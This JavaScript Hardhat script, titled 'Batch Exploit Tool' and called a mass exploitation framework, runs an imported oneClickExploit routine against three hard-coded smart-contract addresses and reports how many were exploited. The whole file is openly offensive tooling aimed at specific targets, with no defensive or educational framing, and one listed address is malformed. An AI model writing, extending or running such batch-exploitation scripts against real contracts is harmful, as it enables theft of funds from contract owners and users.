const { ethers } = require("hardhat");
const { oneClickExploit } = require("./automated_exploit_suite");

/**
 * @title Batch Exploit Tool
 * @notice Exploit multiple contracts in one go
 * @dev Mass exploitation framework
 */

async function batchExploit() {
  console.log("\n🚀 BATCH EXPLOIT TOOL");
  console.log("====================");
  
  // List of targets to exploit
  const targets = [
    "0x8d0BB74e37ab644964AcA2f3Fbe12b9147f9d84",
    "0xA6dfb62fc572Da152A335384f7724535b9DEfC84",
    "0xcA8Fa8f0b631EcdB18Cda619C4Fc9d197c8aFfCa"
  ];
  
  const results = [];
  
  for (const target of targets) {
    console.log(`\n📋 Exploiting ${target}...`);
    console.log("─".repeat(50));
    
    try {
      const result = await oneClickExploit(target);
      results.push({
        target,
        success: result.success,
        backdoors: result.target.backdoors.length,
        exploitability: result.target.exploitability
      });
    } catch (error) {
      console.log(`❌ Failed: ${error.message}`);
      results.push({
        target,
        success: false,
        error: error.message
      });
    }
  }
  
  // Summary
  console.log("\n📊 BATCH EXPLOIT SUMMARY");
  console.log("========================");
  
  const successful = results.filter(r => r.success).length;
  console.log(`Total targets: ${targets.length}`);
  console.log(`Successful exploits: ${successful}`);
  console.log(`Success rate: ${(successful / targets.length * 100).toFixed(1)}%`);
  
  console.log("\nDetails:");
  results.forEach(r => {
    if (r.success) {
      console.log(`✅ ${r.target.slice(0, 10)}... - ${r.backdoors} backdoors (${r.exploitability})`);
    } else {
      console.log(`❌ ${r.target.slice(0, 10)}... - ${r.error || "Not vulnerable"}`);
    }
  });
}

batchExploit()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Error:", error);
    process.exit(1);
  });
